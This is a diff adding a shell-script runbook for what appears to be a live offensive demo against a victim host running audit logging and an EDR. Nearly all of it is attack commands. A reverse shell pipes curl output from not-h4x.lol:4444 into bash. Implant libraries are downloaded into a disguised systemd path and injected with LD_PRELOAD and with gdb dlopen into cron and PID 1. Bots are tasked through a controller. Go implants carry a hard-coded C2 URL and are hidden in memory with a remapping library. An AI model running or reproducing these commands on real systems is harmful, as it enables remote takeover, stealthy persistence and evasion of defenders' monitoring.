@@ -1,0 +1,306 @@
+!/bin/ksh
+
+# Windows:
+# 1 - Curlrevshell
+# 2 - Demobotnetcontroller
+# 3 - Ops
+# 4 - Build
+# 5 - Manpages/Code
+
+# Victim
+echo '
+        sudo auditctl -D
+        sudo auditctl -a always,exit -F arch=b64 -S execve -F success=1 -F auid!=0 -F auid!=-1
+        sudo auditctl -l
+        pgrep procrastination || /usr/local/sbin/procrastinationedr -log /var/log/edr.log >/dev/null 2>&1 &
+        rm -fv /run/user/1001/systemd/propagate/*
+' | ssh victim sudo sh
+
+# Build
+pkill dsc_loader
+bmake -C $HOME/src && bmake -C $HOME/src clean
+
+# Curlrevshell
+curlrevshell -callback-address not-h4x.lol
+
+# Ops
+rm -v ~/demobotnet/*-*
+cd $HOME/src
+./exploit.sh '
+curl \
+        -sk \
+        --pinnedpubkey \
+                sha256//cVQqY3gx/qRIe7Zct9/8BFHfyBLV6xMOnGXbWzTPuxo= \
+        https://not-h4x.lol:4444/c |
+bash >/dev/null 2>&1 &'
+# ~/src/exploit.sh 'curl -sk --pinnedpubkey sha256//cVQqY3gx/qRIe7Zct9/8BFHfyBLV6xMOnGXbWzTPuxo= https://not-h4x.lol:4444/c | bash >/dev/null 2>&1 &'
+
+# Curlrevshell
+ps awwwfux
+uname -a
+id
+# Pid of not_curl
+ls -l /proc/1065/exe
+
+# Build
+cd $HOME/src/the_c_api
+cc -o loader ./loader.c
+cc -fPIC -shared -o print_maps.so ./print_maps.c
+file loader print_maps.so
+strace -o strace.out ./loader ./print_maps.so
+cat <strace.out
+
+# Demobotnetcontroller
+demobotnetcontroller -request-timeout 3m | jq
+
+# Build
+cd $HOME/src/dishonest_soft_cheese
+echo 'char BEACON_SH[] = {' >beacon.h
+perl -gpe '$_=join"",map{"0x$_,"}unpack"(H2)*"' beacon.sh >>beacon.h
+echo '0x00};' >>beacon.h
+cc -fPIC -shared -o dishonest_soft_cheese.so ./dishonest_soft_cheese.c
+cc -o dsc_loader ./dsc_loader.c
+file dsc_loader dishonest_soft_cheese.so
+./dsc_loader &
+
+# Ops
+cd ~/demobotnet
+ls -lrt
+# ID of DSCLoader
+echo 'ps wwwfux' >build-stuart-190864_tmp
+mv -v build-stuart-190864_{tmp,task}
+ls -lrt
+cat <build-stuart-190864
+
+# Build
+cp ~/src/dishonest_soft_cheese/dishonest_soft_cheese.so ~/crs/files
+
+# Curlrevshell
+echo -E "$(</proc/mounts)"
+
+# Ops
+cd ~/crs/ctrl-i
+ls -l
+
+# Curlrevshell
+<tab>
+tab_list
+_cat /proc/mounts
+ls -la /run/user/1001/systemd/propagate
+curl \
+        --silent \
+        --insecure \
+        --pinnedpubkey sha256//cVQqY3gx/qRIe7Zct9/8BFHfyBLV6xMOnGXbWzTPuxo= \
+        https://not-h4x.lol:4444/dishonest_soft_cheese.so \
+        >/run/user/1001/systemd/propagate/dishonest_soft_cheese.lock
+ls -l /run/user/1001/systemd/propagate/dishonest_soft_cheese.lock
+which systemd-inhibit
+( LD_PRELOAD=/run/user/1001/systemd/propagate/dishonest_soft_cheese.lock \
+        systemd-inhibit </dev/null >&0 2>&0 & ) &
+
+# Ops
+cd ~/demobotnet
+ls -lrt
+# ID of systemd-inhibit
+echo 'ps wwwfux' >victim-svr-1092_tmp && mv victim-svr-1092_{tmp,task}
+ls -lrt
+cat <victim-svr-1092
+
+# Curlrevshell
+# PID of systemd-inhibit
+_cat /proc/1092/maps
+_catz /proc/1092/environ
+
+# Build
+cd ~/src/dishonest_soft_cheese
+cc -fPIC -shared -o dishonest_soft_cheese_thread.so ./dishonest_soft_cheese_thread.c
+cp dishonest_soft_cheese_thread.so ~/crs/files
+
+# Curlrevshell
+curl \
+        --silent \
+        --insecure \
+        --pinnedpubkey sha256//cVQqY3gx/qRIe7Zct9/8BFHfyBLV6xMOnGXbWzTPuxo= \
+        https://not-h4x.lol:4444/dishonest_soft_cheese_thread.so \
+        >/run/user/1001/systemd/propagate/dishonest_soft_cheese_thread.lock
+ls -l /run/user/1001/systemd/propagate/dishonest_soft_cheese_thread.lock
+sudo gdb <<_eof
+attach $(pgrep cron)
+print (void *)dlopen("/run/user/1001/systemd/propagate/dishonest_soft_cheese_thread.lock", 2)
+_eof
+
+# Ops
+cd ~/demobotnet
+ls -lrt
+# ID of cron
+echo 'ps awwwfux' >victim-root-674_tmp && mv victim-root-674_{tmp,task}
+ls -lrt
+cat <victim-root-674
+
+# Curlrevshell
+enable /run/user/1001/systemd/propagate/dishonest_soft_cheese_thread.lock
+
+# Build
+cd $HOME/src/horizontal_aubergine
+go build \
+        -buildmode=c-shared \
+        -ldflags "-s -w \
+                -X main.Fingerprint=sha256//cVQqY3gx/qRIe7Zct9/8BFHfyBLV6xMOnGXbWzTPuxo= \
+                -X main.URL=https://not-h4x.lol:4444/io" \
+        -trimpath \
+        -o horizontal_aubergine.so
+
+# Ops
+cd $HOME/demobotnet
+ls -lrt
+# ID of victim-svr...
+file ~/src/horizontal_aubergine/horizontal_aubergine.so
+~/src/toprintf.pl \
+        /run/user/1001/systemd/propagate/horizontal_aubergine.lock \
+       ~/src/horizontal_aubergine/horizontal_aubergine.so >victim-svr-1092_tmp
+head victim-svr-1092_tmp
+cat >>victim-svr-1092_tmp <<_eof
+<<<"enable /run/user/1001/systemd/propagate/horizontal_aubergine.lock" \
+exec -a turtle bash \
+>/dev/null 2>&1 &
+_eof
+tail victim-svr-1092_tmp
+ls -hl ~/src/horizontal_aubergine/horizontal_aubergine.so victim-svr-1092_tmp
+mv victim-svr-1092_{tmp,task}
+for i in `jot 18`; do sleep 10; echo -n "$i "; done; echo
+
+# Wait for 180s
+
+# Curlrevshell
+ps awwwfux
+ls -l /proc/$$/exe
+rm -v /run/user/1001/systemd/propagate/horizontal_aubergine.lock
+<tab>
+_cat /proc/$$/maps
+_catz /proc/$$/environ
+# Start of library from maps
+dd \
+        if=/proc/$$/mem \
+        bs=1 \
+        skip=$((0x7f64509bc000)) \
+        count=4 \
+        status=none |
+hexdump -C
+
+# Build
+cd $HOME/src/the_c_api
+curl -ZOOL https://raw.githubusercontent.com/magisterquis/sneaky_remap/refs/heads/master/sneaky_remap.{c,h}
+cc \
+        -fPIC -shared \
+        -DSREM_DEBUG \
+        -o print_maps_sneakily_remapped.so \
+        ./print_maps_sneakily_remapped.c \
+        ./sneaky_remap.c
+strace -o strace.out ./loader ./print_maps_sneakily_remapped.so
+cat <strace.out
+cd $HOME/src/dishonest_soft_cheese
+curl -ZOOL https://raw.githubusercontent.com/magisterquis/sneaky_remap/refs/heads/master/sneaky_remap.{c,h}
+cc \
+        -fPIC -shared \
+        -o dishonest_soft_cheese_thread_sneakily_remapped.so \
+        dishonest_soft_cheese_thread_sneakily_remapped.c \
+        sneaky_remap.c
+file dishonest_soft_cheese_thread_sneakily_remapped.so
+
+# Ops
+cd ~/crs/ctrl-i
+ls -l
+~/src/toprintf.pl \
+        /run/user/1001/systemd/propagate/dishonest_soft_cheese_thread_sneakily_remapped.lock \
+        ~/src/dishonest_soft_cheese/dishonest_soft_cheese_thread_sneakily_remapped.so \
+        >upload.sh
+ls -hl upload.sh
+
+# Curlrevshell
+<Tab>
+ls -l /run/user/1001/systemd/propagate/dishonest_soft_cheese_thread_sneakily_remapped.lock
+
+# Ops
+rm upload.sh
+
+# Curlrevshell
+file /run/user/1001/systemd/propagate/dishonest_soft_cheese_thread_sneakily_remapped.lock
+sudo gdb <<_eof
+attach 1
+print (void *)dlopen("/run/user/1001/systemd/propagate/dishonest_soft_cheese_thread_sneakily_remapped.lock", 2)
+_eof
+ls -l /run/user/1001/systemd/propagate/dishonest_soft_cheese_thread_sneakily_remapped.lock
+_cat /proc/1/maps
+echo $USER
+kill -9 $$
+
+# Ops
+cd ~/demobotnet
+ls -lrt
+echo 'ps awwwfux; cat </proc/1/maps' >victim-root-1_tmp && mv victim-root-1_{tmp,task}
+cat <victim-root-1
+# Start of r--p before r-xp region
+cat >victim-root-1_tmp <<_eof
+dd \
+        if=/proc/1/mem \
+        bs=1 \
+        skip=$((0x7f8858e4a000)) \
+        count=4 \
+        status=none |
+hexdump -C
+_eof
+mv victim-root-1_{tmp,task}
+tail -n 2 victim-root-1
+
+# Build
+cd ~/src
+bmake clean
+cd ~/src/horizontal_aubergine_sneakily_remapped
+bmake horizontal_aubergine_sneakily_remapped.go init.c
+go clean -modcache
+bmake -C ../horizontal_aubergine horizontal_aubergine.so
+go get github.com/magisterquis/sneaky_remap
+CGO_CFLAGS="-DSREM_CGO_START_FLAGS=SREM_SRS_RMELF|SREM_SRS_UNLINK" \
+go build \
+        -buildmode=c-shared \
+        -ldflags "-s -w \
+                -X main.Fingerprint=sha256//cVQqY3gx/qRIe7Zct9/8BFHfyBLV6xMOnGXbWzTPuxo= \
+                -X main.URL=https://not-h4x.lol:4444/io" \
+        -o horizontal_aubergine_sneakily_remapped.so \
+        -trimpath
+file horizontal_aubergine_sneakily_remapped.so
+
+# Ops
+cd $HOME/demobotnet
+ls -lrt
+~/src/toprintf.pl \
+        /run/user/1001/systemd/propagate/horizontal_aubergine_sneakily_remapped.lock \
+       ~/src/horizontal_aubergine_sneakily_remapped/horizontal_aubergine_sneakily_remapped.so \
+       >victim-root-1_tmp
+cat >>victim-root-1_tmp <<_eof
+<<<"enable /run/user/1001/systemd/propagate/horizontal_aubergine_sneakily_remapped.lock" \
+exec -a dentist bash \
+>/dev/null 2>&1 &
+_eof
+ls -hl victim-root-1_tmp
+mv victim-root-1_{tmp,task}
+for i in `jot 18`; do sleep 10; echo -n "$i "; done; echo
+
+# Wait for 180s
+
+# Curlrevshell
+ps awwwfux
+ls /run/user/1001/systemd/propagate/horizontal_aubergine_sneakily_remapped.lock
+<Tab>
+_cat /proc/$$/maps
+# Start of r--p before r-xp region
+dd \
+        if=/proc/$$/mem \
+        bs=1 \
+        skip=$((0x7fadcd1c7000)) \
+        count=4 \
+        status=none |
+hexdump -C
+
+
+# vim: cc= nonu ft=sh
